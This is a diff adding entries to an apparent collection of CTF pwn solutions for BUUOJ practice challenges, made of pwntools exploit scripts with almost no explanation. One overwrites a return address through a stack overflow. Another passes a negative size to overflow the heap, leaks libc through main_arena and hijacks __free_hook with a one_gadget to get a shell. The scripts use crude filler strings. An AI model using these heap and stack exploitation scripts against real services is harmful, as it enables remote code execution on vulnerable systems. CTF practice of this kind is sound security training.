@@ -492,6 +492,86 @@ icon: icon-html
   r.interactive()
   ```
 
+* ### ciscn_2019_s_4
+
+  ciscn_2019_es_2
+
+* ### bbys_tu_2016
+
+  ```python
+  from pwn import *
+  r = remote('pwn.buuoj.cn',20060)
+  payload = 'a'*24+p32(0x804856d)+p32(0)
+  r.sendline(payload)
+  r.interactive()
+  ```
+
+* ### ciscn_2019_sw_7
+
+  ```python
+  from pwn import *
+  r = remote('pwn.buuoj.cn',20134)
+  elf = ELF('./ciscn_2019_sw_7')
+  libc = ELF('./x64_libc.so.6')
+  
+  def add(size,content):
+  	r.sendlineafter('>','1')
+  	r.sendlineafter('note:',str(size))
+  	r.sendlineafter('note:',str(content))
+  	r.recvuntil('[')
+  	leak = r.recvuntil(']',drop = True)
+  	return int(leak,16)
+  
+  def show(index):
+  	r.sendlineafter('>','2')
+  	r.sendlineafter('Index:',str(index))
+  
+  def edit():
+  	r.sendlineafter('>','3')
+  	print('wdnmd')
+  
+  def delete(index):
+  	r.sendlineafter('>','4')
+  	r.sendlineafter('Index:',str(index))
+  
+  
+  add(0x10,'fuck')
+  add(0x10,'fuck')
+  add(0x60,'fuck')
+  add(0x60,'fuck')
+  add(0x10,'fuck')
+  delete(0)
+  payload = p64(0)*2+p64(0x91)+p64(0)*5
+  add(-1,payload)
+  delete(1)
+  add(0x10,'fuck')
+  show(2)
+  r.recvuntil('2 : ')
+  main_arena_88 = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
+  main_arena = main_arena_88 - 88
+  libc_base = main_arena - 0x3c4b20 
+  one = libc_base + 0x4526a
+  free_hook = libc_base + 0x3C67A8
+  log.success('libc_base:'+hex(libc_base))
+  log.success('free_hook:'+hex(free_hook))
+  log.info(hex(free_hook-0x40))
+  
+  delete(0)
+  payload = p64(0)*2+p64(0x21)+p64(0)*3+p64(0x71)+p64(0)+p64(free_hook-0x40)
+  add(-1,payload)
+  add(0x60,'fuck')
+  delete(0)
+  delete(3)
+  
+  payload = p64(0)*20+p64(0x71)+p64(free_hook-0x33)
+  add(-1,payload)
+  add(0x60,'fuck')
+  payload = '\x7f\x00\x00'+p64(0)*3+p64(one)
+  add(0x60,payload)
+  delete(4)
+  r.interactive()
+  ```
+
   
 
 
